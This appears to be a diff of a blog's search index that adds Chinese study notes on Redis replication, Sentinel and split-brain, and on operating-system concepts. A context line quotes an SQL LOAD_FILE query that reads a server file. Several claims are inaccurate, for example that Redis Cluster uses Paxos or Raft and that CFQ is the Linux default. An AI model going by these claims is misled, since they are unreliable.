+架构图+---------+         +---------+         +---------+|Sentinel1|         |Sentinel2|         |Sentinel3|+----+----+         +----+----+         +----+----+     \                    |                   /      \                  |                  /       \                |                 /        +------------+  |  +------------+                     |  |  |                  +--v--v--v--+                  |  Master   |                  +--+-----+--+                     |     |                  +--v--+ +--v--+                  |Slave1| |Slave2|                  +------+ +------+
+
+核心组件
+监控（Monitor）：定时 PING 主从节点
+通知（Notification）：主节点异常后发起故障报告
+投票（Leader Election）：多个哨兵协商选主
+故障转移（Failover）：重新选主并通知所有从库更新主节点
+
+配置示例sentinel monitor mymaster 127.0.0.1 6379 2sentinel down-after-milliseconds mymaster 5000sentinel failover-timeout mymaster 10000sentinel parallel-syncs mymaster 1
+
+特点
+最少部署 3 个哨兵节点，确保仲裁可靠性
+会自动修改从库指向新主库
+与客户端配合使用，实现服务发现（客户端动态连接主节点）
+
+
+自问自答
+Redis 主从同步机制是什么？全量同步和增量同步怎么实现？
+Redis Sentinel 的作用是什么？如何实现自动故障转移？
+Redis 主从架构如何避免脑裂？
+Redis 从库能写入吗？为什么？
+Redis Sentinel 和 ZooKeeper 的区别？
+
+
+实战建议
+
+
+建议
+理由
+
+
+
+使用至少 1 主 2 从 3 哨兵结构
+实现高可用、读写分离
+
+
+设置 min-slaves-to-write
+保证主库写操作安全
+
+
+Sentinel + 客户端主节点发现
+防止客户端连接老主节点
+
+
+定期监控主从延迟
+避免读到旧数据
+
+
+Redis 主从架构如何避免脑裂使用 Redis Sentinel（哨兵）Redis Sentinel 是官方提供的高可用性解决方案，主要用于监控 Redis 实例的状态，进行故障转移，并通知管理员。通过 Redis Sentinel 可以有效避免脑裂问题，具体做法包括：
+
+监控主从节点：Sentinel 定期检查 Redis 实例的健康状况，一旦主节点不可用，Sentinel 会自动选举一个新的主节点。
+故障转移：当检测到主节点不可用时，Sentinel 会从从节点中选举一个新的主节点，自动进行故障转移，确保服务的持续可用。
+通知报警：在发生故障时，Sentinel 会通过邮件、短信等方式通知管理员，便于及时处理。
+
+这种方式可以确保即使主节点失效，从节点能够迅速接管，减少脑裂的风险。
+配置 auto-aof-rewrite 和 appendonlyRedis 在启用 AOF（Append Only File）持久化模式时，每个写操作都会被记录到 AOF 文件中，这样可以在恢复时保持数据一致性。脑裂发生时，如果从节点与主节点的数据不一致，AOF 文件可以在重启时应用，确保数据恢复。
+然而，仅依赖 AOF 并不能完全避免脑裂，结合 Redis Sentinel 可以增强整体的高可用性和一致性。
+配置 min-slaves-to-write 和 min-slaves-max-lag为了减少脑裂的可能性，可以在主节点上配置以下参数：
+
+**min-slaves-to-write**：在进行写操作时，主节点要求至少有 N 个从节点同步确认。这有助于确保主节点的数据不会丢失，并避免主从数据不一致。
+**min-slaves-max-lag**：限制从节点的最大延迟，如果某些从节点的同步延迟过大，主节点将停止接受写操作，避免因为数据延迟而导致的数据不一致。
+
+通过这些配置，确保主节点只有在至少一部分从节点同步成功的情况下才会执行写操作，有助于减少脑裂的发生。
+使用 Redis Cluster（集群）Redis 集群是一种分布式部署方式，能够通过分片将数据分布到多个节点上，每个主节点都有一个或多个从节点进行备份。在 Redis 集群中：
+
+主从备份：每个主节点都有一个或多个从节点作为备份，确保主节点故障时可以进行快速的故障转移。
+自动选举：集群内部会自动进行主节点的选举，避免了因为某个节点不可用而导致的数据不一致。
+PAXOS 或 Raft 协议：集群内部使用一致性协议来确保数据的一致性，避免脑裂问题。
+
+使用 Redis 集群可以通过分布式架构减少单点故障的影响，自动化的故障转移机制有效降低了脑裂发生的几率。
+合理设计客户端架构为了避免在 Redis 主从架构中发生脑裂问题，客户端架构需要能够动态适应主从节点的变化。现代 Redis 客户端（如 redis-py）通常支持与 Redis Sentinel 或 Redis Cluster 协作，能够自动获取当前的主节点信息，并在发生故障时自动切换连接。
+客户端应具备以下功能：
+
+自动发现主节点：客户端能够自动从 Sentinel 或集群获取主节点信息，确保在节点变化时无缝切换。
+支持故障转移：客户端支持 Sentinel 的故障转移机制，能够在主节点不可用时自动连接到新的主节点。
+
+通过设计智能客户端，可以减少由于节点故障带来的脑裂问题。
+监控和报警系统除了配置 Redis Sentinel 和 Redis 集群外，建立全面的监控和报警系统同样重要。通过监控 Redis 实例的健康状态，可以在节点出现异常时及时发现问题，避免脑裂的发生。
+常见的监控项包括：
+
+节点的连接状态和响应时间
+主从同步的延迟
+Redis 实例的内存和 CPU 使用情况
+
+结合报警系统，确保在发生故障时能够迅速采取措施进行修复，防止脑裂的发生。
+总结通过使用 Redis Sentinel 或 Redis 集群，并合理配置主从同步策略，可以有效避免 Redis 主从架构中的脑裂问题。此外，设计智能客户端架构和建立完善的监控报警机制，也能进一步提升系统的容错能力，确保 Redis 在高可用性和一致性方面的稳定运行。
+Redis Sentinel 和 ZooKeeper 的区别设计目标和功能Redis Sentinel： Redis Sentinel 是专为 Redis 提供高可用性解决方案的工具。它主要负责监控 Redis 实例，检测主节点的状态，并在主节点故障时执行自动故障转移，将从节点提升为新的主节点。它的核心功能包括故障检测、故障转移、通知和监控。Redis Sentinel 适用于 Redis 集群的高可用性管理。
+ZooKeeper： ZooKeeper 是一个分布式协调服务，旨在帮助不同的分布式应用系统管理配置、命名、同步服务等。它不仅限于 Redis，广泛用于需要高一致性和协调的分布式系统中。ZooKeeper 提供了分布式锁、配置管理、节点监控、领导者选举等多种功能，适用于大规模的分布式应用。ZooKeeper 提供的强一致性协议使得它适用于任何需要分布式协调的应用。
+总结Redis Sentinel 和 ZooKeeper 都是高可用性和分布式系统中的重要工具，但它们的应用场景、设计目标和功能有所不同。Redis Sentinel 专为 Redis 提供高可用性解决方案，适用于 Redis 集群的监控和故障转移。而 ZooKeeper 是一个通用的分布式协调服务，适用于广泛的分布式系统，提供强一致性和协调功能，支持更复杂的分布式应用。
 ]]></content>
       <tags>
-        <tag>漏洞分析</tag>
-        <tag>漏洞复现</tag>
-        <tag>Linux Kernel</tag>
+        <tag>Redis</tag>
       </tags>
   </entry>
   <entry>
@@ -3375,6 +4482,1890 @@ SELECT LOAD_FILE(&#x27;/var/lib/mysql-files/notes.txt&#x27;);
       </tags>
   </entry>
   <entry>
+    <title>操作系统</title>
+    <url>/2025/04/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[操作系统的基本概念什么是操作系统操作系统（Operating System，简称 OS）是管理计算机硬件和软件资源的系统程序，是用户与硬件之间的中介。它负责管理 CPU、内存、磁盘、外设等资源，调度任务的执行，并为应用程序提供统一的接口。
+常见的操作系统包括 Linux、Windows、macOS、Android、iOS 等。不同的操作系统在用户体验、系统结构和调度策略上各有差异，但其核心机制大体相似。
+
+操作系统的主要功能进程管理进程是正在运行的程序实例。操作系统负责创建、调度、终止进程，并提供进程间通信（IPC）机制。多进程系统可以并发运行多个任务，提高资源利用率。
+内存管理操作系统需要管理所有程序的内存空间，避免冲突，并提供抽象的虚拟地址空间，使得每个程序看似拥有完整的内存。分页、分段、交换空间（Swap）等技术常用于内存管理。
+文件系统文件系统是组织和存储数据的结构方式。它定义了文件的命名、权限、目录结构、读写方式等。常见的文件系统包括 FAT32、NTFS、ext4 等。
+设备管理所有硬件设备如硬盘、网络卡、显示器等都通过驱动程序与操作系统交互。操作系统负责管理这些设备的访问权限、调度和数据传输。
+用户接口操作系统提供命令行界面（CLI）或图形用户界面（GUI），作为用户与系统交互的桥梁。例如 bash、cmd、GNOME 等。
+
+进程管理什么是进程进程（Process）是操作系统资源分配的基本单位，是程序在运行时的一个实例。一个程序可以对应多个进程，比如打开多个浏览器窗口，每一个窗口就是一个进程。
+操作系统通过进程来实现多任务运行，每个进程都有自己的地址空间、代码、数据和运行状态。
+
+进程与程序的区别程序是静态的代码文件，是指令和数据的集合，而进程是程序执行时的动态实体。程序可以看作是进程的模板。
+简单说，程序是“静止”的，进程是“活着”的。
+
+进程的状态一个进程在生命周期中通常会经历以下几种状态：
+
+就绪（Ready）：进程已准备好运行，等待 CPU 分配时间片。
+运行（Running）：进程正在使用 CPU 运行指令。
+阻塞（Blocked）：进程等待某个事件（如 I&#x2F;O 完成）而暂停运行。
+终止（Terminated）：进程运行结束，资源被回收。
+新建（New）：刚创建，还未就绪。
+挂起（Suspended）：被系统暂停，可能因资源限制或人工干预。
+
+
+上下文切换（Context Switch）多进程系统中，操作系统需要在不同进程之间切换 CPU 使用权。为了让切换透明且安全，系统会在切换前保存当前进程的状态（寄存器、程序计数器、堆栈指针等），切换后再恢复另一个进程的状态。
+这种切换过程称为上下文切换。虽然切换频繁带来了并发体验，但频繁上下文切换会引起性能损耗。
+
+线程与进程的关系线程（Thread）是比进程更小的执行单元。多个线程可以共享同一个进程的资源（如内存），但它们有自己的栈和寄存器。
+
+进程是资源分配的单位，线程是 CPU 调度的单位。
+线程切换的开销比进程小，因此多线程常用于高性能并发编程。
+
+
+多进程与多线程的对比
+
+
+特性
+多进程
+多线程
+
+
+
+内存空间
+每个进程独立
+同一进程的线程共享空间
+
+
+创建开销
+较大
+较小
+
+
+通信方式
+使用进程间通信（IPC）
+直接共享内存，需同步控制
+
+
+稳定性
+一个进程崩溃不会影响其他
+一个线程崩溃可能影响整个进程
+
+
+适用场景
+安全隔离、重任务分工
+轻量级并发、高 IO 效率
+
+
+
+进程调度算法操作系统在多个进程之间分配 CPU 的方式称为调度。不同的调度算法适用于不同场景：
+
+先来先服务（FCFS）：按进程到达顺序排队处理，简单但不公平。
+短作业优先（SJF）：优先处理运行时间短的任务，平均等待时间短，但可能饿死长任务。
+时间片轮转（RR）：给每个进程分配固定时间片，公平性好，适合分时系统。
+优先级调度：按优先级执行高的进程，易导致低优先级进程长时间等待。
+多级反馈队列（MLFQ）：动态调整进程优先级，综合考虑响应时间和公平性，复杂但实用。
+完全公平调度（CFS）：CFS 通过维护一个 红黑树 来管理所有可执行进程。每个进程会根据其 虚拟运行时间（也称为“权重”或“时间片”）被放置在红黑树中，进程的虚拟运行时间越小，越先被调度执行。Linux默认采用该算法。CFS 设计的目标是确保每个进程（或线程）都能公平地共享 CPU 时间，从而实现较为平衡的性能表现，特别是对于多核和多线程的环境
+
+
+进程间通信（IPC）当多个进程需要协作时，就必须进行通信。常见的通信方式包括：
+
+管道（Pipe）：一种半双工通信机制，只能在父子进程之间使用。
+命名管道（FIFO）：增强版的管道，支持不相关进程间通信。
+消息队列：进程以消息为单位进行通信，系统管理消息缓冲区。
+共享内存：最高效的通信方式，多个进程访问同一块物理内存，但需要加锁同步。
+信号量：主要用于同步机制，避免竞争条件。
+套接字（Socket）：支持不同主机之间的进程通信。
+
+
+同步与互斥当多个线程或进程共享资源时，必须保证数据一致性，避免“竞态条件”（Race Condition）。这需要使用同步和互斥机制：
+
+互斥锁（Mutex）：一段代码在同一时刻只能被一个线程访问。
+信号量（Semaphore）：一种计数锁，可以控制访问某资源的线程数。
+自旋锁（Spinlock）：不断尝试获取锁，适合锁持有时间短的场景。
+条件变量：配合锁使用，实现复杂的等待-唤醒机制。
+
+
+进程间通信（IPC）在多进程系统中，不同的进程运行在独立的内存空间中，默认情况下彼此之间无法直接访问对方的数据。然而，实际应用中很多任务都需要多个进程协作完成，这就必须依赖进程间通信机制（IPC）来交换数据、传递信号或同步行为。
+操作系统提供了多种 IPC 方法，不同的方法适用于不同的场景，权衡了效率、复杂度和安全性。
+
+IPC 的典型用途
+数据传输：在进程之间传递数据，例如图像处理中的主进程和工作进程。
+事件通知：某进程完成任务后通知另一个进程，如 GUI 与后台服务的交互。
+资源共享：多个进程共同使用某个资源时，通过同步机制避免冲突。
+进程控制：父进程控制子进程的行为，如终止、暂停、唤醒等。
+
+
+常见的进程间通信方式管道（Pipe）管道是一种最基础的 IPC 方式，只能在有亲缘关系的进程之间使用，如父子进程。
+
+单向传输，数据只能从写端流向读端。
+典型用法：ls | grep &quot;txt&quot;，Shell 会创建两个进程，用管道连接它们的输出和输入。
+
+系统调用：
+int pipe(int fd[2]);
+
+fd[0] 是读端，fd[1] 是写端。
+命名管道（FIFO）命名管道是管道的增强版本，允许无血缘关系的进程通信，通过文件系统中的特殊文件来标识。
+
+数据读写像文件操作一样进行。
+可以跨进程、甚至跨 Shell 通信。
+使用 mkfifo() 或 mknod() 创建。
+
+mkfifo /tmp/myfifo
+
+消息队列（Message Queue）消息队列允许进程以消息为单位异步通信。内核负责缓存消息，进程读取时按消息顺序或优先级读取。
+
+支持多生产者、多消费者模型。
+消息结构化，通信可靠。
+不共享内存，较安全。
+
+系统调用：
+msgget(), msgsnd(), msgrcv(), msgctl()
+
+共享内存（Shared Memory）共享内存将一块物理内存映射到多个进程的地址空间，是效率最高的一种通信方式。
+
+多个进程可以同时读写共享区域，适合高频数据交换。
+通常需要配合信号量或互斥锁来同步访问，避免数据竞争。
+适合大数据量的传输场景，如图像处理、视频编码等。
+
+系统调用：
+shmget(), shmat(), shmdt(), shmctl()
+
+信号量（Semaphore）信号量并不直接传输数据，而是用于实现进程间的同步与互斥控制。
+
+类似交通红绿灯，控制进程对共享资源的访问。
+信号量可与共享内存搭配使用，实现高效且安全的通信。
+
+系统调用：
+semget(), semop(), semctl()
+
+信号（Signal）信号是一种轻量级的通知机制，操作系统通过信号向进程传递事件通知。
+
+类似中断，用于处理如中止、超时、非法访问等事件。
+常见信号有 SIGINT（Ctrl+C）、SIGKILL、SIGTERM 等。
+可自定义信号处理函数，使用 signal() 或 sigaction() 注册。
+
+套接字（Socket）套接字支持不同主机或本机任意进程之间的通信，是构建网络通信的基础。
+
+分为**本地套接字（Unix Domain Socket）和网络套接字（TCP&#x2F;UDP）**。
+本地套接字用于同一台机器内的进程通信，性能高于 TCP 套接字。
+网络套接字支持跨主机通信，是分布式系统通信的核心方式。
+
+系统调用：
+socket(), bind(), listen(), accept(), connect(), send(), recv()
+
+socket有多种不同类型，比如常见的ip:port是网络套接字
+
+
+
+socket 类型
+地址格式
+用途
+
+
+
+AF_INET
+IP:PORT
+IPv4 网络通信
+
+
+AF_INET6
+[IPv6]:PORT
+IPv6 网络通信
+
+
+AF_UNIX &#x2F; AF_LOCAL
+文件路径（如 /tmp/mysock）
+本地进程通信（IPC）
+
+
+AF_PACKET
+网络接口 + 协议
+底层网络抓包（如 Wireshark）
+
+
+AF_BLUETOOTH
+MAC 地址 + 通道
+蓝牙通信
+
+
+AF_NETLINK
+内核通信通道
+Linux 内核与用户空间通信
+
+
+
+实际开发中如何选择 IPC 方式
+对于高频大数据传输：优先使用共享内存 + 同步机制
+对于结构化、可靠消息传递：使用消息队列或本地套接字
+对于跨主机通信：使用网络套接字（如 TCP）
+对于简单通知或事件触发：使用信号或信号量
+父子进程间传输：使用管道或共享内存
+多线程通信：直接共享内存，配合互斥锁或条件变量
+
+
+内存管理内存管理的作用内存管理的目标是高效、安全、合理地分配系统内存资源。现代操作系统通过内存管理机制，让每个进程都以为自己拥有完整的独立内存空间，实际上却在后台进行着复杂的资源调度和地址映射。
+内存管理不仅负责分配和回收内存，还必须处理内存保护、共享、虚拟化等需求。
+
+地址空间与地址类型逻辑地址（虚拟地址）逻辑地址是由程序生成的地址，也叫虚拟地址。在程序中访问内存时，使用的就是逻辑地址。
+物理地址物理地址是真正被映射到内存芯片上的地址，由硬件识别。操作系统通过内存管理单元（MMU）将逻辑地址转换成物理地址。
+地址空间
+逻辑地址空间：进程能看到的内存范围。
+物理地址空间：实际硬件可用的内存范围。
+
+每个进程有独立的逻辑地址空间，操作系统通过地址转换机制将其映射到共享的物理内存上。
+
+分段（Segmentation）分段是一种将逻辑地址空间划分为多个“逻辑单元”的方法，比如代码段、数据段、堆、栈等。
+
+每段具有独立的基址和长度。
+程序更容易实现模块化管理。
+缺点是段长不固定，容易产生外部碎片。
+
+分段常用于早期操作系统或嵌入式系统，在现代系统中通常结合分页一起使用。
+
+
+分页（Paging）分页是将物理内存和逻辑内存都划分成等大小的固定块，分别叫做：
+
+页（Page）：逻辑内存单位
+帧（Frame）：物理内存单位
+
+操作系统维护一个页表（Page Table），用于将每个页映射到对应的帧，解决了分段带来的外部碎片问题。
+
+每个进程都有自己的页表
+地址转换过程由 MMU 自动完成
+
+地址转换过程逻辑地址 &#x3D; 页号 + 页内偏移查页表得到帧号，组合成物理地址。
+
+虚拟内存（Virtual Memory）虚拟内存是操作系统通过分页机制提供的一种内存扩展技术。即使物理内存不足，也可以通过将部分内存页暂存到磁盘（称为交换空间或 Swap）来继续执行程序。
+
+提供了比实际物理内存更大的地址空间
+支持按需调页，程序启动时不需要全部加载到内存
+支持内存共享和内存保护机制
+
+
+页面置换算法当内存不足，必须将一部分内存页换出磁盘，空出空间加载新页，这称为页面置换。操作系统使用页面置换算法来决定“淘汰哪一页”。
+常见算法包括：
+FIFO（先进先出）最早进入内存的页最先被换出，简单但效率不佳，容易出现 Belady 异常（缓存更大反而更差）。
+LRU（最近最少使用）淘汰最近最少使用的页，基于访问历史，命中率高，但实现复杂，通常需要硬件支持或近似算法。
+Clock（时钟算法）一种 LRU 的近似实现，使用一个“指针”遍历页表，查看是否被访问过，没访问的就换出。
+
+内存分配策略操作系统在分配内存块时，也使用了不同的策略：
+
+首次适配（First Fit）：从头开始找第一个够用的空闲块
+最佳适配（Best Fit）：找最接近所需大小的空闲块，减少碎片
+最差适配（Worst Fit）：找最大的空闲块，预留更多剩余空间
+
+这些策略都面临一个问题：内存碎片，包括：
+
+外部碎片：空闲块分布零散，总空间够但连续不够
+内部碎片：分配的块比实际需求大，造成浪费
+
+分页能很好地解决这两个问题，但会带来页表维护开销。
+
+多级页表与快表（TLB）在分页系统中，页表过大时会引起访问效率下降。为了解决这个问题，操作系统引入了：
+
+多级页表：将页表本身分页，分层管理，节省内存空间
+TLB（Translation Lookaside Buffer）：一种缓存页表项的高速缓冲区，提升地址转换速度
+
+如果页表命中 TLB，地址转换非常快；如果未命中，就需要多次内存访问。
+
+内存保护与共享现代操作系统通过 MMU 提供内存保护机制：
+
+每个进程只能访问自己的地址空间
+通过设置页表项中的访问权限，实现读写保护
+共享内存（如动态链接库）可以被多个进程映射到相同的物理帧上，提升内存利用率
+
+
+典型案例：Linux 内存结构在 Linux 中，每个进程的虚拟地址空间大致如下：
+高地址---------------------内核空间---------------------用户堆栈（Stack）共享库（.so）堆（Heap）未初始化数据段（.bss）初始化数据段（.data）代码段（.text）---------------------低地址
+
+堆向上增长，栈向下增长，这样可以更好地利用地址空间。
+
+文件系统文件系统的作用文件系统是操作系统中负责管理和存储数据的子系统，其核心目标是为用户提供一种抽象、统一、安全、高效的数据访问方式。
+通过文件系统，用户可以方便地创建、读取、修改、删除文件和目录，而无需关心底层磁盘的组织方式。
+
+文件的逻辑结构从操作系统角度看，文件是逻辑上的字节序列，可以是文本、图片、程序、数据库文件等。文件通常包括以下信息：
+
+文件数据：实际内容
+元数据（Metadata）：描述文件的属性，如文件名、大小、创建时间、权限等
+
+
+文件目录组织为了便于管理大量文件，操作系统使用目录结构进行层级分类。常见目录结构包括：
+单层目录结构所有文件存储在一个目录下，简单但混乱，不适合多用户系统。
+二级目录结构每个用户一个独立目录，解决了命名冲突，但目录层级仍然不够丰富。
+树形目录结构（现代系统通用）支持多层嵌套子目录，灵活且可扩展。路径分为：
+
+绝对路径：从根目录 / 开始，如 /home/user/docs
+相对路径：基于当前目录，如 ../images
+
+
+inode（索引节点）Linux 等类 Unix 系统中，每个文件都有一个唯一的索引节点（inode），用于记录文件的元数据和磁盘位置。
+inode 包含以下信息：
+
+文件类型（普通文件、目录、符号链接等）
+文件权限（rwx）
+所有者 UID、组 GID
+创建、访问、修改时间
+文件大小
+指向数据块的指针
+
+文件名和 inode 是分离的。多个文件名可以指向同一个 inode（硬链接）。
+
+文件的访问权限Unix 系统使用三类用户 + 三种权限的模型：
+
+用户类型：
+所有者（User）
+所在组（Group）
+其他用户（Others）
+
+
+权限类型：
+读（r）：查看文件内容或目录列表
+写（w）：修改文件内容或目录结构
+执行（x）：运行文件或进入目录
+
+
+
+例如权限串 -rw-r--r-- 表示一个普通文件，拥有者可读写，组和其他用户只读。
+
+磁盘空间的分配方式文件的数据被存储在磁盘块（block）中，磁盘块的分配方式会影响读写性能和碎片率：
+连续分配文件占用连续的磁盘块，读写性能高，但不利于文件扩展，容易产生外部碎片。
+链式分配每个磁盘块中记录下一个块的地址，文件可任意扩展，但随机访问性能差。
+索引分配每个文件有一个索引块，记录所有数据块的地址，灵活且易于管理，是现代文件系统的主流方式。
+
+常见文件系统类型FAT（File Allocation Table）
+早期 Windows 使用，简单但易碎片化
+无权限管理机制，适合 U 盘、存储卡等移动设备
+
+NTFS（Windows 默认）
+支持权限控制、日志、压缩、加密等特性
+稳定性和扩展性好，适用于大型存储系统
+
+ext 系列（Linux）
+ext3：支持日志机制
+ext4：支持大文件、文件系统检查更快，广泛应用于 Linux 发行版
+
+XFS、ZFS、Btrfs 等
+更现代的文件系统，支持快照、复制、自动修复等高级特性，适用于云计算和企业环境
+
+
+缓存与写入机制操作系统并不会每次写入都直接同步到磁盘，而是使用缓存机制提升性能：
+
+页缓存（Page Cache）：内存中保存文件内容
+写回机制（Write-back）：延迟写入，提高效率
+写通机制（Write-through）：写操作同步写入磁盘，更安全但性能差
+
+可以使用 fsync() 或 sync 命令强制刷新缓存。
+
+符号链接与硬链接硬链接（Hard Link）
+多个文件名指向同一个 inode
+删除任意一个不会影响其他链接
+不能跨文件系统或对目录使用
+
+符号链接（Symbolic Link）
+类似快捷方式，指向目标文件路径
+本质是一个独立文件
+可以跨文件系统使用
+
+
+文件系统的挂载与卸载在 Unix&#x2F;Linux 中，所有设备上的文件系统都被“挂载”到主目录树上。
+
+使用 mount 命令将设备挂载到某个目录
+使用 umount 卸载
+/etc/fstab 可配置开机自动挂载项
+
+挂载是将不同存储介质的内容统一整合到单一的目录结构中。
+
+文件描述符文件描述符（File Descriptor，FD） 是一个相对抽象的概念，但它在操作系统（尤其是 Linux&#x2F;Unix 系统）中起着至关重要的作用。简而言之，文件描述符是一个整数，用于标识一个打开的文件或 I&#x2F;O 资源（如套接字、管道等）。
+文件描述符的基本概念在 Linux&#x2F;Unix 系统中，当一个进程打开一个文件或设备时，操作系统会分配一个文件描述符来引用该文件或设备。进程通过文件描述符与文件或设备进行交互，而不是直接操作文件名或设备。
+可以将文件描述符看作是一个“索引”，它指向操作系统内核中的一个数据结构，该数据结构描述了打开文件的相关信息，如文件的位置、文件的读写权限、文件的类型等。
+文件描述符的范围
+标准输入（stdin）：文件描述符 0
+标准输出（stdout）：文件描述符 1
+标准错误（stderr）：文件描述符 2
+
+这些是系统启动时就自动打开的文件描述符，通常用来处理命令行输入输出。
+对于用户程序打开的文件或设备，操作系统会从 3 开始分配文件描述符。每打开一个文件或 I&#x2F;O 资源，操作系统会返回一个新的文件描述符。
+文件描述符与文件操作文件描述符是进程与文件、套接字等 I&#x2F;O 资源进行交互的 接口。通过文件描述符，进程可以执行各种操作，如读取、写入、关闭等。
+示例
+打开文件：
+
+int fd = open(&quot;file.txt&quot;, O_RDONLY);
+
+这里，open() 系统调用返回一个文件描述符 fd，它代表了 &quot;file.txt&quot; 这个文件。
+
+读写文件：
+
+char buffer[100];int bytes_read = read(fd, buffer, 100);
+
+read() 系统调用使用文件描述符 fd 来读取文件内容。
+
+关闭文件：
+
+close(fd);
+
+close() 系统调用用来关闭文件描述符 fd，释放内核资源。
+文件描述符的底层实现操作系统内部使用文件描述符来管理文件。每个文件描述符对应一个 文件表项（file table entry），它包含了以下信息：
+
+文件的偏移量（即文件指针的位置）
+文件的访问权限
+当前打开的文件的状态（如是否已打开）
+
+这些信息存在于操作系统内核的内存中。当进程使用文件描述符进行操作时，内核会根据该描述符查找对应的文件表项，从而完成对文件的读写、关闭等操作。
+文件描述符的用途文件描述符不仅仅用于文件，还用于其他类型的 I&#x2F;O 资源，如：
+
+网络套接字（Socket）：用于处理网络通信。
+管道（Pipe）：用于进程间通信（IPC）。
+设备文件：如 /dev/null、/dev/sda 等，表示硬件设备。
+
+因此，文件描述符是操作系统实现 I&#x2F;O 操作的一个 抽象接口，它使得程序可以通过统一的方式访问不同的资源。
+示例：标准输入输出的使用在 C 语言中，你可以通过文件描述符直接进行标准输入输出操作：
+#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;    char buf[100];    int bytes_read = read(0, buf, sizeof(buf));  // 从标准输入读取数据，文件描述符 0 是标准输入    write(1, buf, bytes_read);  // 向标准输出写入数据，文件描述符 1 是标准输出    return 0;&#125;
+
+在这个例子中，0 和 1 就是标准输入和标准输出的文件描述符，read() 和 write() 系统调用通过这些文件描述符与 I&#x2F;O 设备交互。
+
+总结
+文件描述符 是操作系统分配给进程的整数，用于表示已打开的文件、套接字、管道等 I&#x2F;O 资源。
+它是进程与外部资源进行交互的 抽象接口，允许操作系统统一管理所有类型的 I&#x2F;O 操作。
+文件描述符通常从 3 开始，标准输入、标准输出、标准错误分别是 0、1、2。
+通过文件描述符，程序可以执行如读取、写入、关闭等操作，而无需直接处理底层的设备细节。
+
+虽然文件描述符的概念抽象，但它是操作系统中 I&#x2F;O 操作的基础，理解它有助于更好地掌握系统资源的管理。
+
+设备管理与I&#x2F;O系统设备管理的目标操作系统中的设备管理负责协调各种输入输出设备的访问和调度，包括磁盘、键盘、显示器、网卡、打印机等。
+主要目标包括：
+
+统一接口：为应用程序屏蔽硬件差异
+资源共享：协调多个进程访问同一设备
+并发控制：避免冲突和竞争
+性能优化：提升设备利用率和响应速度
+
+
+设备的分类按功能和控制方式，设备可以分为以下几类：
+按功能划分
+块设备（Block Devices）：以固定大小块为单位读写，如硬盘、SSD、光驱
+字符设备（Character Devices）：按字节流方式读写，如串口、键盘、鼠标
+网络设备（Network Devices）：进行数据包发送和接收，如网卡
+
+按访问方式划分
+随机访问设备：如磁盘，支持跳转到任意位置读写
+顺序访问设备：如磁带，必须按顺序读取
+
+
+驱动程序的作用设备驱动程序是设备和操作系统之间的“翻译官”，将统一的系统调用接口转换成设备控制指令。
+驱动程序通常以模块形式加载到内核中，具备以下特性：
+
+面向特定硬件编写，强依赖设备细节
+提供初始化、读写、中断处理等功能
+支持热插拔、错误恢复、功耗管理等高级功能
+
+现代操作系统使用 **设备树（Device Tree）**或 ACPI 表进行设备发现和初始化。
+
+I&#x2F;O 操作的基本流程一次典型的 I&#x2F;O 操作大致流程如下：
+
+用户调用标准库函数（如 read()、write()）
+操作系统发出系统调用，进入内核
+驱动程序控制设备开始传输
+设备完成操作后发送中断信号
+操作系统唤醒等待进程，返回数据
+
+
+I&#x2F;O 模型操作系统提供多种 I&#x2F;O 模型，用于平衡“等待时间”和“并发能力”。
+阻塞 I&#x2F;O调用方发出 I&#x2F;O 请求后，阻塞等待数据返回，适合简单场景，但性能不高。
+非阻塞 I&#x2F;O立即返回，如果没有数据可读，则返回错误码。适合轮询模型。
+多路复用 I&#x2F;O（select&#x2F;poll&#x2F;epoll）单个线程监控多个 I&#x2F;O 事件，适合高并发网络服务器。
+
+select：支持有限文件描述符，性能一般
+poll：不限数量，但每次都要遍历
+epoll：事件驱动机制，性能优越（Linux 特有）
+
+异步 I&#x2F;O（AIO）I&#x2F;O 调用立即返回，操作系统后台完成数据传输后通知用户程序，真正意义上的“非阻塞”。
+
+实现复杂，但极大减少线程上下文切换
+在高性能服务器和数据库中常见
+
+
+中断机制与 DMA中断机制设备完成操作后，通过发送中断请求（IRQ）通知 CPU，无需程序主动等待。
+
+硬件中断：设备主动发起
+软件中断：程序触发，如 int 0x80 系统调用
+
+中断处理程序运行在内核态，必须快速响应并尽快返回。
+DMA（Direct Memory Access）DMA 控制器允许设备绕过 CPU 直接访问内存，极大提高 I&#x2F;O 效率。
+
+典型应用：磁盘读写、大规模数据传输
+CPU 只需发出命令，数据搬运由 DMA 完成
+
+
+缓冲区与缓存机制I&#x2F;O 操作通常通过缓冲区实现数据的批量传输，减少频繁调用和上下文切换：
+
+用户缓冲区：由应用程序分配，如读取文件时的 buffer
+内核缓冲区：系统内部缓存区，如页缓存、IO 缓冲
+
+Linux 提供如下几种常见缓存机制：
+
+页缓存（Page Cache）：文件内容缓存，提高读写性能
+目录项缓存（dentry cache）：目录路径缓存，提升文件系统效率
+inode 缓存：保存文件 inode 信息，避免重复读盘
+
+
+I&#x2F;O 调度算法当多个进程同时请求磁盘 I&#x2F;O 时，操作系统通过调度算法优化执行顺序：
+
+FCFS（先来先服务）：简单但效率低
+SSTF（最短寻道时间优先）：优先处理距离当前磁头最近的请求
+SCAN（电梯算法）：磁头像电梯一样来回移动处理请求
+CFQ（完全公平队列）：为每个进程分配时间片，保持公平性（Linux 默认）
+
+
+设备文件与 &#x2F;dev 目录Linux 中设备被抽象为文件，统一存储在 /dev 目录中。
+
+每个设备文件对应一个驱动和设备实例
+使用主设备号（major）标识驱动程序
+使用次设备号（minor）标识设备编号
+
+例如：
+/dev/sda      # 第一块磁盘/dev/tty0     # 第一个终端/dev/null     # 空设备，丢弃写入数据
+
+
+零拷贝零拷贝 指的是在数据传输过程中，尽量避免 CPU 进行多次内存拷贝操作，从而提升 I&#x2F;O 性能，降低 CPU 负载，尤其适用于高性能网络服务和大文件传输场景。
+传统的数据传输方式在用户态和内核态之间涉及多次数据复制，而零拷贝通过各种机制尽量避免这些不必要的拷贝。
+
+传统 I&#x2F;O 的拷贝过程（以发送文件为例）以一个应用程序发送文件数据到网络为例，传统流程大概如下：
+
+磁盘上的文件内容通过 DMA 拷贝到内核缓冲区（Page Cache）
+操作系统通过 read() 将数据从内核缓冲区拷贝到用户缓冲区（用户态）
+应用程序调用 send()，再把用户缓冲区数据拷贝回内核的 socket 缓冲区
+最后，数据通过网卡 DMA 发送出去
+
+这整个过程涉及两次用户态和内核态之间的内存拷贝，非常耗费 CPU 和内存带宽。
+
